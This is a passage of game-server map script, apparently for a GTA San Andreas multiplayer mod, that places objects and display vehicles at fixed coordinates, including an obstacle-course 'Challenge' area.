	CreateSObject(1722, -1009.94324, 510.22864, 13.14716,   0.00000, 0.00000, 224.05562);
	CreateSObject(1722, -1009.31714, 510.84680, 13.14716,   0.00000, 0.00000, 224.05562);
	CreateSObject(1722, -983.14966, 484.49774, 13.14720,   0.00000, 0.00000, 44.05560);
	CreateSObject(1722, -983.76947, 483.87158, 13.14720,   0.00000, 0.00000, 44.05560);
	CreateSObject(1722, -984.39874, 483.25626, 13.14720,   0.00000, 0.00000, 44.05560);
	CreateSObject(1722, -985.05829, 482.58527, 13.14720,   0.00000, 0.00000, 44.05560);
	CreateSObject(1726, -1029.92236, 485.53098, 13.14870,   0.00000, 0.00000, 134.47830);
	CreateSObject(1726, -1031.27966, 488.85678, 13.14870,   0.00000, 0.00000, 44.47830);
	CreateSObject(1727, -1027.40137, 488.24551, 13.14870,   0.00000, 0.00000, -91.04400);
	CreateSObject(2024, -1028.69495, 487.24451, 13.14950,   0.00000, 0.00000, 90.00000);
	CreateSObject(2773, -1019.38824, 477.92322, 13.67000,   0.00000, 0.00000, 134.72165);
	CreateSObject(2773, -1016.25336, 474.63779, 13.67000,   0.00000, 0.00000, 134.72165);
	CreateSObject(2773, -1014.54956, 476.33780, 13.67000,   0.00000, 0.00000, 134.72165);
	CreateSObject(2773, -1017.66956, 479.60962, 13.67000,   0.00000, 0.00000, 134.72165);
	CreateSObject(19446, -1016.46875, 477.60867, 13.09000,   0.00000, 90.00000, 134.78799);
	CreateSObject(19446, -1009.60352, 484.41217, 13.09000,   0.00000, 90.00000, 134.78799);
	CreateSObject(19446, -1002.75562, 491.20367, 13.09000,   0.00000, 90.00000, 134.78799);
	CreateSObject(19446, -995.90424, 497.97644, 13.09000,   0.00000, 90.00000, 134.78799);
	CreateSObject(19446, -993.60852, 500.25439, 13.09000,   0.00000, 90.00000, 134.78799);
	CreateViewOnlyVehicle(447, -1005.3768, 478.2479, 14.4695, 0.0000, -1, -1);
	CreateViewOnlyVehicle(469, -991.9222, 484.4522, 14.3990, 0.0000, -1, -1);
	CreateViewOnlyVehicle(487, -1015.9564, 488.7090, 14.6576, 268.7618, -1, -1);
	CreateViewOnlyVehicle(487, -1009.9350, 501.9481, 14.6576, 268.7618, -1, -1);
	CreateViewOnlyVehicle(465, -988.0540, 499.7204, 17.2893, 41.1325, -1, -1);
	// Challenge
	CreateSObject(8147, 1497.01953125, 1770.2939453125, 12.913526535034, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(8147, 1497.0087890625, 1624.517578125, 12.921339035034, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(8147, 1497.0192871094, 1478.6066894531, 12.921339035034, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(8147, 1497.0283203125, 1332.640625, 12.921339035034, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(8210, 1472.4389648438, 1251.2292480469, 12.921339035034, 0, 0, 19.5, object_show_distance, 0, world_challenges);
	CreateSObject(987, 1435.017578125, 1240.40234375, 9.8203125, 0, 0, 6.4984130859375, object_show_distance, 0, world_challenges);
	CreateSObject(987, 1423.0516357422, 1240.7338867188, 9.8203125, 0, 0, 358.25, object_show_distance, 0, world_challenges);
	CreateSObject(987, 1411.443359375, 1243.62109375, 9.8203125, 0, 0, 346, object_show_distance, 0, world_challenges);
	CreateSObject(987, 1400.6938476563, 1248.8720703125, 9.8203125, 0, 0, 334, object_show_distance, 0, world_challenges);
	CreateSObject(987, 1390.9376220703, 1255.8188476563, 9.8203125, 0, 0, 324.5, object_show_distance, 0, world_challenges);
	CreateSObject(987, 1382.7663574219, 1264.5639648438, 9.8203125, 0, 0, 313, object_show_distance, 0, world_challenges);
	CreateSObject(987, 1375.8942871094, 1274.3699951172, 9.8203125, 0, 0, 305, object_show_distance, 0, world_challenges);
	CreateSObject(987, 1371.4609375, 1285.4829101563, 9.8203125, 0, 0, 291.75, object_show_distance, 0, world_challenges);
	CreateSObject(987, 1369.2528076172, 1297.2427978516, 9.8203125, 0, 0, 280.5, object_show_distance, 0, world_challenges);
	CreateSObject(8147, 1369.5, 1370.0546875, 12.921339035034, 0, 0, 179.99450683594, object_show_distance, 0, world_challenges);
	CreateSObject(8147, 1369.4970703125, 1516.0390625, 12.921339035034, 0, 0, 179.99450683594, object_show_distance, 0, world_challenges);
	CreateSObject(8147, 1369.6572265625, 1627.3984375, 12.827119827271, 0, 0, 179.99450683594, object_show_distance, 0, world_challenges);
	CreateSObject(987, 1373.2529296875, 1711.1796875, 9.8203125, 0, 0, 250.49926757813, object_show_distance, 0, world_challenges);
	CreateSObject(987, 1378.4206542969, 1721.9732666016, 9.8203125, 0, 0, 244.49926757813, object_show_distance, 0, world_challenges);
	CreateSObject(987, 1385.7056884766, 1731.4760742188, 9.8203134536743, 0, 0, 232.49526977539, object_show_distance, 0, world_challenges);
	CreateSObject(987, 1394.5369873047, 1739.5676269531, 9.8203125, 0, 0, 222.49267578125, object_show_distance, 0, world_challenges);
	CreateSObject(987, 1404.85546875, 1745.6379394531, 9.8203086853027, 0, 0, 210.48962402344, object_show_distance, 0, world_challenges);
	CreateSObject(987, 1415.9572753906, 1750.1088867188, 9.8203125, 0, 0, 201.98706054688, object_show_distance, 0, world_challenges);
	CreateSObject(987, 1427.8122558594, 1751.7258300781, 9.8203125, 0, 0, 187.73364257813, object_show_distance, 0, world_challenges);
	CreateSObject(987, 1439.7659912109, 1751.7202148438, 9.8203125, 0, 0, 179.72888183594, object_show_distance, 0, world_challenges);
	CreateSObject(987, 1451.4627685547, 1749.1110839844, 9.8203125, 0, 0, 167.47778320313, object_show_distance, 0, world_challenges);
	CreateSObject(987, 1457.3248291016, 1747.3564453125, 9.8203125, 0, 0, 163.9755859375, object_show_distance, 0, world_challenges);
	CreateSObject(8147, 1457.7841796875, 1770.1468505859, 12.921339035034, 0, 0, 180, object_show_distance, 0, world_challenges);
	CreateSObject(8147, 1457.7802734375, 1624.3291015625, 12.913526535034, 0, 0, 179.99450683594, object_show_distance, 0, world_challenges);
	CreateSObject(8147, 1457.7924804688, 1478.4459228516, 12.921339035034, 0, 0, 179.99450683594, object_show_distance, 0, world_challenges);
	CreateSObject(8147, 1457.7719726563, 1370.1889648438, 12.929149627686, 0, 0, 179.99450683594, object_show_distance, 0, world_challenges);
	CreateSObject(987, 1457.5725097656, 1297.0526123047, 9.8203125, 0, 0, 236, object_show_distance, 0, world_challenges);
	CreateSObject(987, 1450.8656005859, 1287.1295166016, 9.8203125, 0, 0, 210.74731445313, object_show_distance, 0, world_challenges);
	CreateSObject(987, 1440.5648193359, 1281.0656738281, 9.8203125, 0, 0, 183.74522399902, object_show_distance, 0, world_challenges);
	CreateSObject(987, 1428.5775146484, 1280.3292236328, 9.8203125, 0, 0, 155.24084472656, object_show_distance, 0, world_challenges);
	CreateSObject(987, 1417.6577148438, 1285.3688964844, 9.8203125, 0, 0, 126.48681640625, object_show_distance, 0, world_challenges);
	CreateSObject(987, 1410.5300292969, 1295.0396728516, 9.8203125, 0, 0, 99.985595703125, object_show_distance, 0, world_challenges);
	CreateSObject(8147, 1408.5855712891, 1378.1162109375, 12.914005279541, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(8147, 1408.5810546875, 1523.900390625, 12.921339035034, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(8147, 1408.5920410156, 1620.2019042969, 12.913526535034, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(987, 1408.9765625, 1693.208984375, 9.8203125, 0, 0, 64.747924804688, object_show_distance, 0, world_challenges);
	CreateSObject(987, 1414.1539306641, 1704.0284423828, 9.8203125, 0, 0, 33.497924804688, object_show_distance, 0, world_challenges);
	CreateSObject(987, 1424.1694335938, 1710.6414794922, 9.8203125, 0, 0, 8.997314453125, object_show_distance, 0, world_challenges);
	CreateSObject(987, 1436.0235595703, 1712.5037841797, 9.8203125, 0, 0, 338.99230957031, object_show_distance, 0, world_challenges);
	CreateSObject(987, 1446.4561767578, 1708.4167480469, 9.8203125, 0, 0, 336.23864746094, object_show_distance, 0, world_challenges);
	CreateSObject(8483, 1449.1171875, 1727.2744140625, 15.601648330688, 0, 0, 179.24743652344, object_show_distance, 0, world_challenges);
	CreateSObject(3534, 1441.1884765625, 1730.50390625, 16.835941314697, 0, 268.24768066406, 359.49462890625, object_show_distance, 0, world_challenges);
	CreateSObject(3534, 1441.5661621094, 1726.2900390625, 16.807723999023, 0, 268.24768066406, 359.49462890625, object_show_distance, 0, world_challenges);
	CreateSObject(3524, 1441.201171875, 1729.59375, 12.705652236938, 0, 319.99877929688, 279.74487304688, object_show_distance, 0, world_challenges);
	CreateSObject(3374, 1494.3841552734, 1797.9631347656, 11.306476593018, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(3374, 1490.3756103516, 1797.9526367188, 14.081434249878, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(3374, 1486.3992919922, 1797.9289550781, 11.306476593018, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(3374, 1482.4208984375, 1797.9638671875, 14.156433105469, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(3374, 1478.4542236328, 1797.9379882813, 11.306476593018, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(3374, 1474.4868164063, 1797.931640625, 14.131433486938, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(3374, 1470.5081787109, 1797.8833007813, 11.306476593018, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(3374, 1466.54296875, 1797.8125, 14.106433868408, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(3374, 1462.5615234375, 1797.859375, 11.306476593018, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1474.41796875, 1798.134765625, 10.21825504303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1490.2822265625, 1798.05078125, 10.21825504303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(2780, 1474.3125, 1798.587890625, 10.079613685608, 0, 0, 179.99450683594, object_show_distance, 0, world_challenges);
	CreateSObject(2780, 1490.1923828125, 1798.4677734375, 10.171195983887, 0, 0, 181.99952697754, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1459.171875, 1797.736328125, 10.21825504303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(2780, 1459.185546875, 1798.2197265625, 10.094635009766, 0, 0, 185.99853515625, object_show_distance, 0, world_challenges);
	CreateSObject(11547, 1487.294921875, 1838.828125, 12.75715637207, 0, 0, 270, object_show_distance, 0, world_challenges);
	CreateSObject(11547, 1467.9713134766, 1838.8363037109, 12.75715637207, 0, 0, 270, object_show_distance, 0, world_challenges);
	CreateSObject(1676, 1482.4528808594, 1798.5939941406, 11.39336681366, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1676, 1466.4194335938, 1798.2216796875, 11.39336681366, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(987, 1497.3173828125, 1843.1218261719, 9.8203125, 0, 0, 180.25, object_show_distance, 0, world_challenges);
	CreateSObject(987, 1485.3369140625, 1843.056640625, 9.8203125, 0, 0, 180.24450683594, object_show_distance, 0, world_challenges);
	CreateSObject(987, 1473.3619384766, 1842.9906005859, 9.8125, 0, 0, 180.24169921875, object_show_distance, 0, world_challenges);
	CreateSObject(987, 1469.3393554688, 1843.0528564453, 9.8125, 0, 0, 180.24169921875, object_show_distance, 0, world_challenges);
	CreateSObject(16310, 1462.09765625, 1726.33203125, 7.2453112602234, 4.8724365234375, 32.129516601563, 86.693145751953, object_show_distance, 0, world_challenges);
	CreateSObject(13641, 1484.9680175781, 1650.1491699219, 9.8125, 0, 0, 268.5, object_show_distance, 0, world_challenges);
	CreateSObject(17565, 1478.9622802734, 1548.2681884766, 12.321206092834, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1462.7890625, 1762.0134277344, 10.21825504303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1471.9221191406, 1762.0532226563, 10.21825504303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1467.6978759766, 1762.0173339844, 10.21825504303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1676, 1489.5570068359, 1730.3909912109, 11.39336681366, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1676, 1480.83984375, 1730.3828125, 11.39336681366, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1676, 1485.0755615234, 1730.42578125, 11.39336681366, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(12808, 1472.7513427734, 1481.2580566406, 12.242963790894, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(11435, 1477.4306640625, 1258.1767578125, 14.481563568115, 0, 0, 181.99952697754, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1490.1583251953, 1473.4046630859, 10.233878135681, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1489.9604492188, 1489.7445068359, 10.22606754303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1481.6895751953, 1547.7987060547, 10.21825504303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1488.6009521484, 1547.6979980469, 10.21825504303, 0, 0, 358, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1464.6284179688, 1547.1246337891, 10.21825504303, 0, 0, 1.9949951171875, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1472.2109375, 1547.0850830078, 10.21825504303, 0, 0, 1.9940185546875, object_show_distance, 0, world_challenges);
	CreateSObject(1676, 1484.9580078125, 1601.7987060547, 11.39336681366, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1676, 1468.2906494141, 1581.3151855469, 11.39336681366, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(3374, 1467.4959716797, 1684.5446777344, 11.306476593018, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(3374, 1471.4970703125, 1684.6009521484, 11.306476593018, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(3877, 1477.3695068359, 1685.5897216797, 11.478240966797, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(3877, 1477.3830566406, 1612.6094970703, 11.478240966797, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(3877, 1477.3699951172, 1517.0964355469, 11.493864059448, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(3877, 1477.3916015625, 1447.7047119141, 11.486053466797, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(3877, 1477.3634033203, 1365.4821777344, 11.493864059448, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(3877, 1477.3570556641, 1281.5295410156, 11.486053466797, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(7392, 1434.3657226563, 1261.5634765625, 17.790390014648, 0, 0, 83.991455078125, object_show_distance, 0, world_challenges);
	CreateSObject(9833, 1469.138671875, 1642.78515625, 13.015043258667, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1483.5166015625, 1685.9407958984, 10.21825504303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1486.8137207031, 1685.8990478516, 10.21825504303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1476.9979248047, 1640.9342041016, 10.21825504303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1468.4096679688, 1618.3778076172, 10.21825504303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1481.0244140625, 1587.521484375, 10.21825504303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1676, 1484.5626220703, 1551.1387939453, 11.39336681366, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(3374, 1475.3885498047, 1414.7894287109, 11.314289093018, 0, 0, 0.25, object_show_distance, 0, world_challenges);
	CreateSObject(3374, 1479.3701171875, 1414.8413085938, 11.322099685669, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(3528, 1477.76953125, 1414.4178466797, 15.709495544434, 0, 0, 86, object_show_distance, 0, world_challenges);
	CreateSObject(1676, 1485.7435302734, 1431.9327392578, 11.40117931366, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1676, 1467.6112060547, 1414.8884277344, 11.40117931366, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1245, 1466.4885253906, 1436.7788085938, 11.307885169983, 0, 0, 92.25, object_show_distance, 0, world_challenges);
	CreateSObject(1503, 1485.0020751953, 1373.1407470703, 9.8203125, 0, 0, 180, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1485.0980224609, 1406.8383789063, 10.233878135681, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1487.525390625, 1406.6787109375, 10.233878135681, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(13562, 1468.5590820313, 1388.1063232422, 10.995325088501, 0, 28, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1676, 1478.8023681641, 1386.8820800781, 11.40117931366, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1471.3603515625, 1374.318359375, 10.22606754303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1484.869140625, 1354.3913574219, 10.22606754303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(13667, 1484.5102539063, 1340.3597412109, 16.616827011108, 0, 0.74993896484375, 100, object_show_distance, 0, world_challenges);
	CreateSObject(3364, 1469.8409423828, 1350.7425537109, 9.8203125, 0, 0, 93, object_show_distance, 0, world_challenges);
	CreateSObject(1676, 1467.8831787109, 1324.2673339844, 11.40117931366, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1676, 1472.365234375, 1324.2119140625, 11.40117931366, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1676, 1476.7376708984, 1324.2143554688, 11.40117931366, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(2780, 1472.2712402344, 1325.8425292969, 9.8203125, 0, 0, 181.99951171875, object_show_distance, 0, world_challenges);
	CreateSObject(3665, 1390.9541015625, 1319.345703125, 11.801904678345, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1482.0615234375, 1296.40234375, 10.22606754303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1485.2109375, 1296.376953125, 10.22606754303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1478.5755615234, 1796.9508056641, 10.21825504303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1469.6942138672, 1683.5230712891, 10.21825504303, 0, 2, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1487.5883789063, 1601.2933349609, 10.21825504303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1484.65625, 1587.1343994141, 10.21825504303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1477.4304199219, 1343.4530029297, 10.22606754303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1503, 1468.9837646484, 1295.9865722656, 9.8203125, 0, 0, 138, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1459.8072509766, 1651.5219726563, 10.21825504303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1459.8337402344, 1511.5548095703, 10.22606754303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1459.6241455078, 1428.3033447266, 10.22606754303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1459.6920166016, 1349.2042236328, 10.22606754303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1459.4196777344, 1295.9831542969, 10.22606754303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1495.4697265625, 1653.8078613281, 10.21825504303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1495.2299804688, 1509.8895263672, 10.22606754303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1495.5101318359, 1423.8634033203, 10.22606754303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1494.7586669922, 1344.2214355469, 10.22606754303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1495.0441894531, 1295.2077636719, 10.241121292114, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(3472, 1389.0246582031, 1369.6047363281, 9.8203125, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(3472, 1389.0196533203, 1445.3221435547, 9.8203125, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(3472, 1388.8531494141, 1528.7048339844, 9.8125, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(3472, 1389.0531005859, 1600.3084716797, 9.8125, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(3472, 1388.8728027344, 1687.2280273438, 9.8203125, 0, 0, 352, object_show_distance, 0, world_challenges);
	CreateSObject(1676, 1394.1394042969, 1319.0373535156, 11.405651092529, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1676, 1383.9738769531, 1318.8629150391, 11.405608177185, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1404.30859375, 1318.142578125, 10.22606754303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1373.8029785156, 1321.3388671875, 10.22606754303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(2780, 1389.1221923828, 1318.8063964844, 9.824728012085, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(3374, 1378.2257080078, 1380.8522949219, 11.314289093018, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(3374, 1382.1387939453, 1380.8802490234, 11.314289093018, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(3515, 1380.2083740234, 1381.1711425781, 13.665536880493, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(13641, 1396.7327880859, 1488.6436767578, 9.8203125, 0, 0, 87, object_show_distance, 0, world_challenges);
	CreateSObject(13647, 1380.6304931641, 1450.8262939453, 9.8203125, 0, 0, 90, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1400.4196777344, 1539.3743896484, 10.21825504303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1399.318359375, 1539.294921875, 10.21825504303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1676, 1397.6357421875, 1539.181640625, 11.39336681366, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1396.0836181641, 1539.1977539063, 10.21825504303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1395.11328125, 1539.2470703125, 10.21825504303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(2780, 1397.1507568359, 1497.1468505859, 9.8203125, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(16310, 1398.1258544922, 1353.8072509766, 7.5703125, 4.8724365234375, 32.129516601563, 86.693115234375, object_show_distance, 0, world_challenges);
	CreateSObject(1676, 1388.98046875, 1353.494140625, 11.40117931366, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1401.7302246094, 1383.1080322266, 10.22606754303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1391.8466796875, 1382.6015625, 10.22606754303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1397.1114501953, 1382.7054443359, 10.22606754303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(16776, 1389.3375244141, 1406.4311523438, 9.545316696167, 0, 0, 270, object_show_distance, 0, world_challenges);
	CreateSObject(1676, 1380.314453125, 1405.0180664063, 11.40117931366, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1676, 1397.8330078125, 1405.373046875, 11.40117931366, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1380.5721435547, 1345.1317138672, 10.22606754303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1380.5654296875, 1361.5048828125, 10.22606754303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(13647, 1381.25390625, 1450.8317871094, 9.8203125, 0, 0, 90, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1371.0249023438, 1305.5631103516, 10.22606754303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1371.2409667969, 1380.9232177734, 10.22606754303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1371.3050537109, 1449.9451904297, 10.22606754303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1371.6103515625, 1525.3979492188, 10.21825504303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1371.6129150391, 1598.3532714844, 10.21825504303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1371.4495849609, 1666.7510986328, 10.22606754303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1371.8487548828, 1697.6810302734, 10.22606754303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1407.0737304688, 1692.8231201172, 10.22606754303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1406.2946777344, 1661.3762207031, 10.22606754303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1406.392578125, 1597.4296875, 10.21825504303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1406.6275634766, 1525.8759765625, 10.21825504303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1406.5625, 1449.0272216797, 10.22606754303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1406.6945800781, 1382.6591796875, 10.22606754303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1406.9036865234, 1304.2353515625, 10.22606754303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1386.1175537109, 1405.0479736328, 10.22606754303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1393.5053710938, 1404.9105224609, 10.22606754303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(3374, 1399.0998535156, 1445.1604003906, 11.314289093018, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(3374, 1395.17578125, 1445.1818847656, 11.314289093018, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(14608, 1397.12890625, 1444.3950195313, 14.291339874268, 0, 0, 138, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1397.1899414063, 1444.6003417969, 10.22606754303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1676, 1390.3465576172, 1475.1882324219, 11.40117931366, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1676, 1387.6180419922, 1475.1688232422, 11.40117931366, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1377.6927490234, 1498.4156494141, 10.22606754303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1378.7930908203, 1498.4146728516, 10.22606754303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1380.6888427734, 1498.3786621094, 10.22606754303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1381.7489013672, 1498.3909912109, 10.22606754303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1383.8050537109, 1498.3757324219, 10.22606754303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1384.8835449219, 1498.435546875, 10.22606754303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(2780, 1381.1671142578, 1498.2435302734, 9.8203125, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(3364, 1381.2674560547, 1524.8883056641, 9.8125, 0, 0, 260, object_show_distance, 0, world_challenges);
	CreateSObject(9833, 1396.9254150391, 1556.2641601563, 13.015043258667, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(12957, 1380.400390625, 1563.0433349609, 10.690716743469, 0, 0, 270, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1382.8466796875, 1546.189453125, 10.21825504303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1380.2531738281, 1546.1212158203, 10.21825504303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1676, 1434.7133789063, 1269.8518066406, 11.40117931366, 0, 0, 270, object_show_distance, 0, world_challenges);
	CreateSObject(1676, 1436.1989746094, 1253.1262207031, 11.40117931366, 0, 0, 278, object_show_distance, 0, world_challenges);
	CreateSObject(13590, 1393.1154785156, 1586.6595458984, 11.013345718384, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1385.8767089844, 1575.5021972656, 10.21825504303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1383.87890625, 1575.595703125, 10.21825504303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1377.8303222656, 1593.7694091797, 10.21825504303, 0, 0, 0, object_show_distance, 0, world_challenges);
